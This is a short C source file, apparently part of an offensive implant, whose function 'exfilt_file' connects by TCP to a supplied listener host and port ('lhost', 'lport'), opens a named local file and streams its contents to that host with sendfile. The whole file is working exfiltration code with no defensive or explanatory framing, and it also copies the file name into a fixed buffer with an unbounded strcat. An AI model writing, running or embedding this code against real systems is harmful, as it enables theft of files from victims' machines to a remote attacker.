#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SIZE 1024

void send_file(FILE *fp, int sockfd)
{
    int n;
    char data[SIZE] = {0};

    while (fgets(data, SIZE, fp) != NULL)
    {
        if (send(sockfd, data, sizeof(data), 0) == -1)
        {
            perror("[-]Error in sending file.");
            exit(1);
        }
        bzero(data, SIZE);
    }
}

void exfilt_file(char *lhost, int lport, char *_filename)
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;
    int fp;
    // socket create and varification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        printf("socket creation failed...\n");
        exit(0);
    }
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(lhost);
    servaddr.sin_port = htons(lport);
    // connect the client socket to server socket
    for (int i = 0; i < 5; i++)
    {
        if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0)
        {
            sleep(1);
            continue;
        }
        break;
    }
    char currentfile[256]="./";
    // *(_filename + strlen(_filename)) = '\0';
    strcat(currentfile,_filename);
    fp = open(currentfile, O_RDONLY);
    if(fp == -1) {
        perror("fp error\n");
        return;
    }
    struct stat stat_buf;
    off_t offset = 0;
    fstat(fp, &stat_buf);
    sendfile(sockfd, fp, &offset, stat_buf.st_size);
    // send_file(fp, sockfd);
    
    close(sockfd);
}